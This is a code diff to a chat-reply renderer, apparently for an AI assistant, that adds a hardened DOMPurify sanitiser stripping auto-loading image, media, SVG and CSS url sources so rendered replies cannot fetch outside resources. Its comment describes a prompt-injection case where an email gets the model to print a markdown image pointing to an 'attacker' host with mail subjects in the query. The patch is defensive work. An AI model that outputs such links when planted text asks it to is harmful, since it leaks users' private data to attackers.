@@ -20,6 +20,23 @@ import yaml from 'highlight.js/lib/languages/yaml';
 import markdown from 'highlight.js/lib/languages/markdown';
 import 'katex/dist/katex.min.css';
 
+// A reply is drawn the moment it arrives, so anything in it that loads by itself (an image, a video poster, a background, a style)
+// would send a request with no tool call and no approval: a mail could ask for ![](https://attacker/?q=<subjects>) and the model
+// might print it. This sanitiser (its own instance, so other users of DOMPurify are untouched) keeps only data: and blob: sources;
+// links stay links, since following one is the person's own click.
+const purify = DOMPurify(window);
+const LOCAL_SRC = /^\s*(data:|blob:)/i;
+const SRC_ATTRS = ['src', 'srcset', 'poster', 'background', 'lowsrc', 'dynsrc', 'data', 'codebase', 'action', 'formaction'];
+purify.addHook('afterSanitizeAttributes', (node) => {
+  for (const a of SRC_ATTRS) { const v = node.getAttribute?.(a); if (v != null && (a === 'srcset' || !LOCAL_SRC.test(v))) node.removeAttribute(a); }
+  node.removeAttribute?.('ping');
+  // SVG pulls in other documents with href on image, use and feImage; only same-document references (#id) stay
+  if (/^(image|use|feimage)$/i.test(node.nodeName)) for (const a of ['href', 'xlink:href']) { const v = node.getAttribute(a); if (v != null && !/^\s*#/.test(v)) node.removeAttribute(a); }
+  const style = node.getAttribute?.('style');
+  if (style && /url\s*\(\s*['"]?\s*(?!#|data:)/i.test(style)) node.removeAttribute('style');
+});
+const PURIFY = { ADD_ATTR: ['target'], FORBID_TAGS: ['style', 'link', 'meta', 'base'] };
+
 Object.entries({
   javascript, typescript, python, rust, json, bash, powershell, css, xml, sql, cpp, java, yaml, markdown,
 }).forEach(([name, lang]) => hljs.registerLanguage(name, lang));
@@ -87,7 +104,7 @@ export function renderBlocks(text) {
     if (part === undefined) {
       const one = [t];
       if (marked.defaults.walkTokens) marked.walkTokens(one, marked.defaults.walkTokens); // the code highlighter hooks in here
-      part = DOMPurify.sanitize(marked.parser(one), { ADD_ATTR: ['target'] });
+      part = purify.sanitize(marked.parser(one), PURIFY);
       if (blocks.size >= BLOCK_CACHE) blocks.delete(blocks.keys().next().value);
       blocks.set(key, part);
     }
